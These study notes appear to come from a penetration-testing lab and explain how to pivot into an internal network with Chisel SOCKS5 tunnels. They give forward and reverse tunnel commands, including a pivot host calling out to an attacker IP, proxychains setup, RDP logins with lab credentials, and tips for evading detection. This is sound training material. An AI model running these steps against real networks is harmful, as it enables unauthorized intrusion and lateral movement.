## Chisel SOCKS5 Tunneling – Quick Rubric

### Purpose

* Pivot traffic into **restricted/internal networks** via HTTP(S) using **SSH-secured tunnels**
* Common use: reach **internal AD/DC, RDP, SMB, LDAP** from an external attack host

---

## Scenario Model

* **Attack Host** (you)
* **Pivot Host** (compromised Ubuntu)
* **Internal Network**: `172.16.5.0/23`
* **Target**: DC `172.16.5.19`
* Direct access ❌ → Pivot tunnel ✅

---

## Setup Workflow (Normal / Forward Mode)

### 1. Get Chisel

```bash
git clone https://github.com/jpillora/chisel.git
cd chisel
go build
```

> If glibc issues → use **prebuilt release binary**

---

### 2. Transfer to Pivot Host

```bash
scp chisel ubuntu@<PIVOT_IP>:~/
```

---

### 3. Start Chisel Server (on Pivot)

```bash
./chisel server -v -p 1234 --socks5
```

* Listens on `0.0.0.0:1234`
* Creates **SOCKS5 proxy**
* Forwards traffic to all networks pivot can reach

---

### 4. Connect Client (on Attack Host)

```bash
./chisel client -v <PIVOT_IP>:1234 socks
```

* Local SOCKS proxy opens on:

  * **127.0.0.1:1080**

---

### 5. Configure Proxychains

```bash
sudo nano /etc/proxychains.conf
```

Add:

```ini
socks5 127.0.0.1 1080
```

Verify:

```bash
tail /etc/proxychains.conf
```

---

### 6. Pivot Traffic

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

✔ Traffic flows:

```
Attack → 127.0.0.1:1080 → Chisel Tunnel → Pivot → Internal Network
```

---

## Reverse Pivot (Firewall-Friendly)

### When to Use

* **Inbound connections blocked** on pivot
* Pivot can only **connect outbound**

---

### 1. Start Server (on Attack Host)

```bash
sudo ./chisel server --reverse -v -p 1234 --socks5
```

---

### 2. Connect Client (on Pivot Host)

```bash
./chisel client -v <ATTACK_IP>:1234 R:socks
```

* SOCKS5 proxy now exposed **on attack host**
* Still uses port **1080**

---

### 3. Proxychains (Same as Before)

```ini
socks5 127.0.0.1 1080
```

---

### 4. Access Internal Target

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---

## Key Flags & Concepts

| Flag        | Meaning                          |
| ----------- | -------------------------------- |
| `--socks5`  | Create SOCKS5 proxy              |
| `--reverse` | Reverse tunnel (client → server) |
| `R:socks`   | Reverse SOCKS proxy              |
| `-p`        | Listening port                   |
| `-v`        | Verbose/debug                    |

---

## Common Uses

* `proxychains nmap`
* `proxychains smbclient`
* `proxychains crackmapexec`
* `proxychains ldapsearch`
* `proxychains xfreerdp`

---

## Detection & OPSEC Notes

* Binary size matters → shrink if needed
* Chisel uses **HTTP + SSH** (often blends in)
* Long-lived tunnels = higher detection risk
* Prefer **reverse mode** in strict firewall environments


